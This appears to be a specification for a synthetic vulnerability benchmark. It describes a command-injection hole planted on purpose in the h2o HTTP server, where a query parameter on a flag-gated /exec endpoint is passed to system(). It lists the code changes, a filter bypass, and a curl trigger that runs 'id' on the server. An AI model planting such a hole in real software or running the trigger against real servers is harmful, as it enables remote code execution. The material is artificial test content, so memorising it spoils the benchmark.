DESCRIPTION:
  CLI-flag-gated command injection in h2o HTTP server. The server must be
  started with --exec-mode for the vulnerable /exec endpoint to be reachable.
  A URL query parameter is copied via snprintf into a 4096-byte buffer then
  passed to system(). An optional --exec-strict flag enables ampersand blocking;
  bypass is to omit that flag.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at top of exec_handler_on_req()
              `if (!exec_mode) return -1;`
              handler not registered at all when exec_mode == 0
  complexity: one condition, one flag, no struct

INPUT_FLOW (I2 — snprintf buffer):
  entry:      HTTP GET /exec?cmd=<payload>  →  req->path (set by HTTP parser)
  path:       exec_handler_on_req() extracts cmd via memcmp/offset arithmetic
              cmd copied into char cmd_buf[4096] via snprintf("%.*s")
              cmd_buf passed directly to system()
  transforms: snprintf copy — length-limited but content unchanged

SANITIZATION (S3 — flag-gated check):
  check:      if exec_strict is set, reject commands containing '&' character
  bypass:     omit --exec-strict flag → ampersand check never performed
  note:       exploit works with just --exec-mode (no --exec-strict)

SINK:        system(cmd_buf) in exec_handler_on_req() (src/main.c)

CHANGED FILES:
  src/main.c — 5 hunks:
    1. globals:            added exec_mode and exec_strict ints,
                           exec_handler_on_req(), register_exec_handler()
    2. longopts[]:         added --exec-mode (E), --exec-strict (T)
    3. optstring:          changed "c:m:tvh" to "c:m:tvhET"
    4. option dispatch:    added case 'E' and 'T' to set flags
    5. post-config:        register_exec_handler() called when exec_mode != 0

EXPLOIT:
  build:   bash build.sh
  start:   ./h2o -c h2o.conf --exec-mode
  trigger: curl 'http://127.0.0.1:18092/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  S3 bypass: --exec-strict is NOT passed, so ampersand check is skipped
  gate bypass: omitting --exec-mode causes handler not to be registered; 404

NOTES:
  - system() output goes to the server's inherited stderr.
  - snprintf truncates commands longer than ~4090 chars.
  - With --exec-strict, commands containing & return HTTP 400.
